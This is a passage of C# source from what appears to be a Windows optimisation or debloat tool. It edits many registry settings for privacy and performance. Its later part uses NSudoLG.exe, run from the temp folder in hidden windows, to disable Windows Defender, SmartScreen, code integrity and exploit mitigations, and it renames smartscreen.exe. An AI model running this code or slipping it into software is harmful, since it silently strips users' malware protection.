			RegistryKey subKey83 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Superfetch/StoreLog", true);
			subKey83.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey83.Close();
			RegistryKey subKey84 = Registry.CurrentUser.CreateSubKey("Control Panel\\Mouse", true);
			subKey84.SetValue("MouseSpeed", "0", RegistryValueKind.String);
			subKey84.SetValue("MouseThreshold1", "0", RegistryValueKind.String);
			subKey84.SetValue("MouseThreshold2", "0", RegistryValueKind.String);
			subKey84.Close();
			RegistryKey subKey85 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel", true);
			subKey85.SetValue("DisableExceptionChainValidation", "1", RegistryValueKind.DWord);
			subKey85.SetValue("KernelSEHOPEnabled", "0", RegistryValueKind.DWord);
			subKey85.SetValue("SerializeTimerExpiration", "0", RegistryValueKind.DWord);
			subKey85.Close();
			RegistryKey subKey86 = Registry.CurrentUser.CreateSubKey("Control Panel\\International\\User Profile", true);
			subKey86.SetValue("HttpAcceptLanguageOptOut", "1", RegistryValueKind.DWord);
			subKey86.Close();
			RegistryKey subKey87 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager", true);
			subKey87.SetValue("SilentInstalledAppsEnabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SystemPaneSuggestionsEnabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SoftLandingEnabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-338393Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-311563Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-353691Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-353694Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-353696Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-338387Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-338389Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-310093Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-338388Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("SubscribedContent-314563Enabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("RotatingLockScreenOverlayEnabled", "0", RegistryValueKind.DWord);
			subKey87.SetValue("RotatingLockScreenEnabled", "0", RegistryValueKind.DWord);
			subKey87.Close();
			RegistryKey subKey88 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true);
			subKey88.SetValue("Start_TrackProgs", "0", RegistryValueKind.DWord);
			subKey88.Close();
			RegistryKey subKey89 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Speech_OneCore\\Settings\\OnlineSpeechPrivacy", true);
			subKey89.SetValue("HasAccepted", "0", RegistryValueKind.DWord);
			subKey89.Close();
			RegistryKey subKey90 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Personalization\\Settings", true);
			subKey90.SetValue("AcceptedPrivacyPolicy", "0", RegistryValueKind.DWord);
			subKey90.Close();
			RegistryKey subKey91 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\InputPersonalization", true);
			subKey91.SetValue("RestrictImplicitInkCollection", "1", RegistryValueKind.DWord);
			subKey91.SetValue("RestrictImplicitTextCollection", "1", RegistryValueKind.DWord);
			subKey91.Close();
			RegistryKey subKey92 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\InputPersonalization\\TrainedDataStore", true);
			subKey92.SetValue("HarvestContacts", "0", RegistryValueKind.DWord);
			subKey92.Close();
			RegistryKey subKey93 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Diagnostics\\DiagTrack", true);
			subKey93.SetValue("ShowedToastAtLevel", "1", RegistryValueKind.DWord);
			subKey93.Close();
			RegistryKey subKey94 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection", true);
			subKey94.SetValue("AllowTelemetry", "0", RegistryValueKind.DWord);
			subKey94.SetValue("DoNotShowFeedbackNotifications", "1", RegistryValueKind.DWord);
			subKey94.Close();
			RegistryKey subKey95 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Diagnostics\\DiagTrack\\EventTranscriptKey", true);
			subKey95.SetValue("EnableEventTranscript", "0", RegistryValueKind.DWord);
			subKey95.Close();
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Siuf\\Rules");
			Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Siuf\\Rules");
			subKey95.Close();
			RegistryKey subKey96 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Siuf\\Rules");
			subKey96.SetValue("NumberOfSIUFInPeriod", "0", RegistryValueKind.DWord);
			subKey96.Close();
			RegistryKey subKey97 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System", true);
			subKey97.SetValue("PublishUserActivities", "0", RegistryValueKind.DWord);
			subKey97.SetValue("UploadUserActivities", "0", RegistryValueKind.DWord);
			subKey97.Close();
			RegistryKey subKey98 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\userNotificationListener", true);
			subKey98.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey98.Close();
			RegistryKey subKey99 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam", true);
			subKey99.SetValue("Value", "Allow", RegistryValueKind.String);
			subKey99.Close();
			RegistryKey subKey100 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone", true);
			subKey100.SetValue("Value", "Allow", RegistryValueKind.String);
			subKey100.Close();
			RegistryKey subKey101 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location", true);
			subKey101.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey101.Close();
			RegistryKey subKey102 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\appDiagnostics", true);
			subKey102.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey102.Close();
			RegistryKey subKey103 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\contacts", true);
			subKey103.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey103.Close();
			RegistryKey subKey104 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\phoneCall", true);
			subKey104.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey104.Close();
			RegistryKey subKey105 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\phoneCallHistory", true);
			subKey105.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey105.Close();
			RegistryKey subKey106 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\userAccountInformation", true);
			subKey106.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey106.Close();
			RegistryKey subKey107 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\radios", true);
			subKey107.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey107.Close();
			RegistryKey subKey108 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\email", true);
			subKey108.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey108.Close();
			RegistryKey subKey109 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\appointments", true);
			subKey109.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey109.Close();
			RegistryKey subKey110 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\userDataTasks", true);
			subKey110.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey110.Close();
			RegistryKey subKey111 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\chat", true);
			subKey111.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey111.Close();
			RegistryKey subKey112 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\broadFileSystemAccess", true);
			subKey112.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey112.Close();
			RegistryKey subKey113 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\bluetoothSync", true);
			subKey113.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey113.Close();
			RegistryKey subKey114 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\videosLibrary", true);
			subKey114.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey114.Close();
			RegistryKey subKey115 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\picturesLibrary", true);
			subKey115.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey115.Close();
			RegistryKey subKey116 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\documentsLibrary", true);
			subKey116.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey116.Close();
			RegistryKey subKey117 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\wifiData", true);
			subKey117.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey117.Close();
			RegistryKey subKey118 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\BackgroundAccessApplications", true);
			subKey118.SetValue("GlobalUserDisabled", "1", RegistryValueKind.DWord);
			subKey118.Close();
			RegistryKey subKey119 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Search", true);
			subKey119.SetValue("BackgroundAppGlobalToggle", "0", RegistryValueKind.DWord);
			subKey119.Close();
			RegistryKey subKey120 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SettingSync", true);
			subKey120.SetValue("SyncPolicy", "5", RegistryValueKind.DWord);
			subKey120.Close();
			RegistryKey subKey121 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SettingSync\\Groups\\BrowserSettings", true);
			subKey121.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey121.Close();
			RegistryKey subKey122 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SettingSync\\Groups\\Credentials", true);
			subKey122.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey122.Close();
			RegistryKey subKey123 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SettingSync\\Groups\\Accessibility", true);
			subKey123.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey123.Close();
			RegistryKey subKey124 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SettingSync\\Groups\\Windows", true);
			subKey124.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey124.Close();
			RegistryKey subKey125 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize", true);
			subKey125.SetValue("EnableTransparency", "0", RegistryValueKind.DWord);
			subKey125.Close();
			RegistryKey subKey126 = Registry.CurrentUser.CreateSubKey("System\\GameConfigStore", true);
			subKey126.SetValue("GameDVR_Enabled", "0", RegistryValueKind.DWord);
			subKey126.Close();
			RegistryKey subKey127 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\GameDVR", true);
			subKey127.SetValue("AppCaptureEnabled", "0", RegistryValueKind.DWord);
			subKey127.Close();
			RegistryKey subKey128 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power", true);
			subKey128.SetValue("HiberbootEnabled", "0", RegistryValueKind.DWord);
			subKey128.Close();
			RegistryKey subKey129 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Power", true);
			subKey129.SetValue("PowerThrottlingOff", "1", RegistryValueKind.DWord);
			subKey129.SetValue("HibernateEnabled", "0", RegistryValueKind.DWord);
			subKey129.Close();
			RegistryKey subKey130 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Maintenance", true);
			subKey130.SetValue("MaintenanceDisabled", "1", RegistryValueKind.DWord);
			subKey130.Close();
			RegistryKey subKey131 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer", true);
			subKey131.SetValue("DisableSearchBoxSuggestions", "1", RegistryValueKind.DWord);
			subKey131.Close();
			RegistryKey subKey132 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\OneDrive", true);
			subKey132.SetValue("DisableFileSyncNGSC", "1", RegistryValueKind.DWord);
			subKey132.Close();
			RegistryKey subKey133 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\PriorityControl", true);
			subKey133.SetValue("Win32PrioritySeparation", "38", RegistryValueKind.DWord);
			subKey133.Close();
			RegistryKey subKey134 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
			subKey134.SetValue("DisableAutomaticRestartSignOn", "1", RegistryValueKind.DWord);
			subKey134.Close();
			RegistryKey subKey135 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments", true);
			subKey135.SetValue("SaveZoneInformation", "1", RegistryValueKind.DWord);
			subKey135.Close();
			RegistryKey subKey136 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\MRT", true);
			subKey136.SetValue("DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			subKey136.Close();
			RegistryKey HypervisorEnforcedCodeIntegrity = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity", true);
			HypervisorEnforcedCodeIntegrity.SetValue("Enabled", "0", RegistryValueKind.DWord);
			HypervisorEnforcedCodeIntegrity.Close();
			RegistryKey subKey137 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\AppCompat", true);
			subKey137.SetValue("AITEnable", "0", RegistryValueKind.DWord);
			subKey137.Close();
			RegistryKey subKey138 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Error Reporting", true);
			subKey138.SetValue("Disabled", "1", RegistryValueKind.DWord);
			subKey138.Close();
			RegistryKey subKey139 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\FTH", true);
			subKey139.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey139.Close();
			RegistryKey subKey140 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\FortniteClient-Win64-Shipping.exe", true);
			subKey140.Close();
			Registry.LocalMachine.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\FortniteClient-Win64-Shipping.exe", true);
			subKey140.Close();
			RegistryKey subKey141 = Registry.CurrentUser.CreateSubKey("Control Panel\\Accessibility\\MouseKeys", true);
			subKey141.SetValue("Flags", "0", RegistryValueKind.String);
			subKey141.Close();
			RegistryKey subKey142 = Registry.CurrentUser.CreateSubKey("Control Panel\\Accessibility\\Keyboard Response", true);
			subKey142.SetValue("Flags", "0", RegistryValueKind.String);
			subKey142.Close();
			RegistryKey subKey143 = Registry.CurrentUser.CreateSubKey("Control Panel\\Accessibility\\StickyKeys", true);
			subKey143.SetValue("Flags", "0", RegistryValueKind.String);
			subKey143.Close();
			RegistryKey subKey144 = Registry.CurrentUser.CreateSubKey("Control Panel\\Accessibility\\ToggleKeys", true);
			subKey144.SetValue("Flags", "0", RegistryValueKind.String);
			subKey144.Close();
			RegistryKey subKey145 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop", true);
			subKey145.SetValue("AutoEndTasks", "1", RegistryValueKind.String);
			subKey145.SetValue("HungAppTimeout", "1000", RegistryValueKind.String);
			subKey145.SetValue("WaitToKillAppTimeout", "2000", RegistryValueKind.String);
			subKey145.SetValue("LowLevelHooksTimeout", "1000", RegistryValueKind.String);
			subKey145.SetValue("MenuShowDelay", "0", RegistryValueKind.String);
			subKey145.SetValue("Win8DpiScaling", "0", RegistryValueKind.DWord);
			subKey145.SetValue("DpiScalingVer", "4096", RegistryValueKind.DWord);
			subKey145.SetValue("LogPixels", "96", RegistryValueKind.DWord);
			subKey145.Close();
			RegistryKey subKey146 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control", true);
			subKey146.SetValue("WaitToKillServiceTimeout", "1500", RegistryValueKind.String);
			subKey146.Close();
			RegistryKey subKey147 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", true);
			subKey147.SetValue("NetworkThrottlingIndex", "10", RegistryValueKind.DWord);
			subKey147.SetValue("SystemResponsiveness", "10", RegistryValueKind.DWord);
			subKey147.Close();
			RegistryKey subKey148 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true);
			subKey148.SetValue("Affinity", "0", RegistryValueKind.DWord);
			subKey148.SetValue("Clock Rate", "10000", RegistryValueKind.DWord);
			subKey148.SetValue("Background Only", "False", RegistryValueKind.String);
			subKey148.SetValue("GPU Priority", "8", RegistryValueKind.DWord);
			subKey148.SetValue("Priority", "6", RegistryValueKind.DWord);
			subKey148.SetValue("Scheduling Category", "High", RegistryValueKind.String);
			subKey148.SetValue("SFIO Priority", "High", RegistryValueKind.String);
			subKey148.SetValue("Latency Sensitive", "True", RegistryValueKind.String);
			subKey148.Close();
			RegistryKey subKey149 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			subKey149.SetValue("ctfmon", "C:\\Windows\\System32\\ctfmon.exe", RegistryValueKind.String);
			subKey149.Close();
			RegistryKey subKey150 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true);
			subKey150.SetValue("ShowSyncProviderNotifications", "0", RegistryValueKind.DWord);
			subKey150.Close();
			RegistryKey subKey151 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\CloudContent", true);
			subKey151.SetValue("ConfigureWindowsSpotlight", "2", RegistryValueKind.DWord);
			subKey151.SetValue("IncludeEnterpriseSpotlight", "0", RegistryValueKind.DWord);
			subKey151.SetValue("DisableWindowsSpotlightFeature", "1", RegistryValueKind.DWord);
			subKey151.SetValue("DisableWindowsSpotlightWindowsWelcomeExperience", "1", RegistryValueKind.DWord);
			subKey151.SetValue("DisableWindowsSpotlightOnActionCenter", "1", RegistryValueKind.DWord);
			subKey151.SetValue("DisableWindowsSpotlightOnSettings", "1", RegistryValueKind.DWord);
			subKey151.SetValue("DisableThirdPartySuggestions", "1", RegistryValueKind.DWord);
			subKey151.SetValue("DisableTailoredExperiencesWithDiagnosticData", "1", RegistryValueKind.DWord);
			subKey151.SetValue("DisableWindowsConsumerFeatures", "1", RegistryValueKind.DWord);
			subKey151.Close();
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager\\Subscriptions", true).Close();
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager\\SuggestedApps", true).Close();
			Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager\\Subscriptions", true);
			subKey109.Close();
			Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager\\SuggestedApps", true);
			subKey109.Close();
			Process process = new Process();
			process.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			Process spynet = new Process();
			spynet.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			spynet.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Spynet\" /v \"SpyNetReporting\" /t REG_DWORD /d \"0\" /f";
			spynet.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			spynet.StartInfo.CreateNoWindow = true;
			spynet.Start();
			spynet.WaitForExit();
			Process spynet2 = new Process();
			spynet2.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			spynet2.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Spynet\" /v \"SubmitSamplesConsent \" /t REG_DWORD /d \"0\" /f";
			spynet2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			spynet2.StartInfo.CreateNoWindow = true;
			spynet2.Start();
			spynet2.WaitForExit();
			Process smartscr3en = new Process();
			smartscr3en.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			smartscr3en.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\" /v \"SmartScreenEnabled \" /t REG_SZ /d \"Off\" /f";
			smartscr3en.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			smartscr3en.StartInfo.CreateNoWindow = true;
			smartscr3en.Start();
			smartscr3en.WaitForExit();
			Process gamebarprecense = new Process();
			gamebarprecense.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			gamebarprecense.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsRuntime\\ActivatableClassId\\Windows.Gaming.GameBar.PresenceServer.Internal.PresenceWriter\" /v \"ActivationType\" /t REG_DWORD /d \"0\" /f";
			gamebarprecense.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			gamebarprecense.StartInfo.CreateNoWindow = true;
			gamebarprecense.Start();
			gamebarprecense.WaitForExit();
			Process process2 = new Process();
			process2.StartInfo.FileName = "powershell.exe";
			process2.StartInfo.Arguments = "Get-AppxPackage -AllUsers Microsoft.549981C3F5F10 | Remove-AppPackage";
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.StartInfo.CreateNoWindow = true;
			process2.Start();
			process2.WaitForExit();
			Process process3 = new Process();
			process3.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process3.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Diagnostics\\Performance\" /v \"DisableDiagnosticTracing\" /t REG_DWORD /d \"1\" /f";
			process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process3.StartInfo.CreateNoWindow = true;
			process3.Start();
			process3.WaitForExit();
			Process process4 = new Process();
			process4.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process4.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f";
			process4.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process4.StartInfo.CreateNoWindow = true;
			process4.Start();
			process4.WaitForExit();
			Process process5 = new Process();
			process5.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process5.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DpaDisabled\" /t REG_DWORD /d \"1\" /f";
			process5.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process5.StartInfo.CreateNoWindow = true;
			process5.Start();
			process5.WaitForExit();
			Process process6 = new Process();
			process6.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process6.StartInfo.Arguments = "-U:T Reg.exe delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityHealth\" /f";
			process6.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process6.StartInfo.CreateNoWindow = true;
			process6.Start();
			process6.WaitForExit();
			Process rundeletewindefend = new Process();
			rundeletewindefend.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			rundeletewindefend.StartInfo.Arguments = "-U:T Reg.exe delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsDefender\" /f";
			rundeletewindefend.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			rundeletewindefend.StartInfo.CreateNoWindow = true;
			rundeletewindefend.Start();
			rundeletewindefend.WaitForExit();
			Process process7 = new Process();
			process7.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process7.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f";
			process7.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process7.StartInfo.CreateNoWindow = true;
			process7.Start();
			process7.WaitForExit();
			Process process8 = new Process();
			process8.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process8.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v \"EnableSmartScreen\" /t REG_DWORD /d \"0\" /f";
			process8.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process8.StartInfo.CreateNoWindow = true;
			process8.Start();
			process8.WaitForExit();
			Process disablesmartscreen = new Process();
			disablesmartscreen.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			disablesmartscreen.StartInfo.Arguments = "-U:T taskkill /f /im smartscreen.exe";
			disablesmartscreen.Start();
			disablesmartscreen.WaitForExit();
			Process disablesmartscreen2 = new Process();
			disablesmartscreen2.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			disablesmartscreen2.StartInfo.Arguments = "-U:T cmd.exe /c \"ren C:\\Windows\\System32\\smartscreen.exe smartscreen.exee\"";
			disablesmartscreen2.Start();
			disablesmartscreen2.WaitForExit();
			Process process9 = new Process();
			process9.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process9.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Systray\" /v \"HideSystray\" /t REG_DWORD /d \"1\" /f";
			process9.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process9.StartInfo.CreateNoWindow = true;
			process9.Start();
			process9.WaitForExit();
			Process process10 = new Process();
			process10.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process10.StartInfo.Arguments = "-U:T sc config wdboot start=disabled";
			process10.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process10.StartInfo.CreateNoWindow = true;
			process10.Start();
			process10.WaitForExit();
			Process process11 = new Process();
			process11.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process11.StartInfo.Arguments = "-U:T sc config wdfilter start=disabled";
			process11.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process11.StartInfo.CreateNoWindow = true;
			process11.Start();
			process11.WaitForExit();
			Process process12 = new Process();
			process12.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process12.StartInfo.Arguments = "-U:T sc config windefend start=disabled";
			process12.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process12.StartInfo.CreateNoWindow = true;
			process12.Start();
			process12.WaitForExit();
			Process process13 = new Process();
			process13.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
			process13.StartInfo.Arguments = "-U:T net stop WinDefend";
